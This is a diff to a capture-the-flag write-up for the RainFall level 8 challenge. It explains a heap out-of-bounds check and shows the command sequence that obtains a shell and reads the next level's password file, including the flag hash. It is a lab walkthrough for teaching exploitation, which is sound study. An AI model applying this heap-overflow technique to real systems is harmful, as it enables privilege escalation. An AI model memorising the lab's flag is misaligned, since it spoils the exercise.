@@ -1,26 +1,73 @@
-Step 1: Analyze the program
-$ ./level8
+# Level 8 - Heap Exploitation
+
+## Vulnerability Analysis
+
+### The Bug
+```c
+auth = malloc(4);      // Only 4 bytes allocated!
+strcpy(auth, input);   // But copies entire input
+
+if (auth[32] != 0)     // Checks 32 bytes past auth
+    system("/bin/sh");
+```
+
+**Problem:** 
+- `auth` only allocates 4 bytes
+- `strcpy` can write beyond this
+- Check looks at `auth[32]` (28 bytes beyond allocation!)
+
+## Exploitation Strategy
+
+We need to make `auth[32]` non-zero by:
+1. Allocating `auth` 
+2. Allocating `service` right after it
+3. The `service` allocation will occupy memory where `auth[32]` would be
+
+## Step-by-Step Exploit
+
+### Understanding Heap Layout
+Heap Memory:
++-----------+
+| auth (4)  | <- auth pointer
++-----------+
+| metadata  | <- heap chunk metadata
++-----------+
+| service   | <- service pointer (will be at auth[32]!)
+| (32+ bytes)|
++-----------+
+
+### Execution
+```bash
+level8@RainFall:~$ ./level8
 (nil), (nil) 
-auth 
-service test
+
+# Step 1: Create auth (small allocation)
+auth test
+0x804a008, (nil)
+
+# Step 2: Create service with enough data
+serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+
+# Step 3: Login (auth[32] now points into service allocation)
 login
-Password:
-
-Step 2: Understand the vulnerability
-- auth command: strcpy() with 30-byte limit
-- service command: strdup() with NO bounds check
-- Heap allocation: service chunk placed after auth in heap
-- login checks auth->magic value at offset 0x20
-
-Step 3: Create heap overflow exploit
-$ ./level8
-(nil), (nil) 
-auth 
-serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-login
-
-Step 4: Got shell and retrieved password
-whoami
+$ whoami
 level9
-cat /home/user/level9/.pass
+$ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
+## Why This Works
+
+1. `auth` is allocated at `0x804a008` (4 bytes)
+2. `service` is allocated at `0x804a018` (16 bytes after)
+3. When code checks `auth[32]`:
+   - `auth + 32 = 0x804a008 + 32 = 0x804a028`
+   - This falls within the `service` allocation!
+   - Since service has data, `auth[32] != 0` is TRUE
+
+## Key Concepts
+- Heap memory layout
+- Use-after-free potential
+- Heap overflow
+- Out-of-bounds access
